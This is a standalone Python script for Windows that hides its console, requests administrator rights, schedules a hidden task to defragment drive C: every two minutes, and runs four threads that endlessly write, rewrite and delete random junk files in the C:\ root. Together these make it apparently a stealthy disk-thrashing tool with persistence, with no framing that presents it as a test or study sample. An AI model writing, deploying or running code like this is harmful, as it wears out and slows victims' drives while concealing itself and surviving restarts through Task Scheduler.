import os
import random
import string
import threading
import time
import sys
import ctypes

WORK_DIR = "C:\\"
THREADS = 4 
DELAY = 0.002
FILE_SIZE_MIN = 8
FILE_SIZE_MAX = 64
SEEKS_PER_FILE = 64
BLOCK_SIZE = 4  # bytes

running = True

def random_filename():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8,32)))

def seek_stormer(thread_id):
    global running
    while running:
        fname = random_filename()
        path = os.path.join(WORK_DIR, fname)
        size = random.randint(FILE_SIZE_MIN, FILE_SIZE_MAX)
        try:
            with open(path, "w+b") as f:
                f.write(os.urandom(size))
                for _ in range(SEEKS_PER_FILE):
                    # Random seek, read, write
                    pos = random.randint(0, max(0, size - BLOCK_SIZE))
                    f.seek(pos)
                    if random.random() < 0.5:
                        f.write(os.urandom(BLOCK_SIZE))
                    else:
                        f.read(BLOCK_SIZE)
                    f.flush()
            # Randomly delete or overwrite file
            if random.random() < 0.7:
                try:
                    os.remove(path)
                except Exception:
                    pass
            else:
                try:
                    with open(path, "r+b") as f:
                        for _ in range(random.randint(8, 32)):
                            pos = random.randint(0, max(0, size - BLOCK_SIZE))
                            f.seek(pos)
                            f.write(os.urandom(BLOCK_SIZE))
                except Exception:
                    pass
            time.sleep(DELAY)
        except Exception:
            time.sleep(0.01)

def schedule_defrag():
    # Windows Task Scheduler: defrag every 2 min
    try:
        cmd = (
            'schtasks /Create /F /SC MINUTE /MO 2 /TN "AutoDefragC" '
            '/TR "defrag C: /U /V" /RL HIGHEST'
        )
        os.system(cmd)
    except Exception:
        pass

def hide_console():
    try:
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
    except Exception:
        pass

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

def request_admin():
    if not is_admin():
        params = " ".join([f'"{arg}"' for arg in sys.argv])
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, params, None, 0
            )
        except Exception:
            pass
        sys.exit(0)

def main():
    global running
    hide_console()
    request_admin()
    schedule_defrag()
    for i in range(THREADS):
        threading.Thread(target=seek_stormer, args=(i,), daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
        time.sleep(2)

if __name__ == "__main__":
    main()
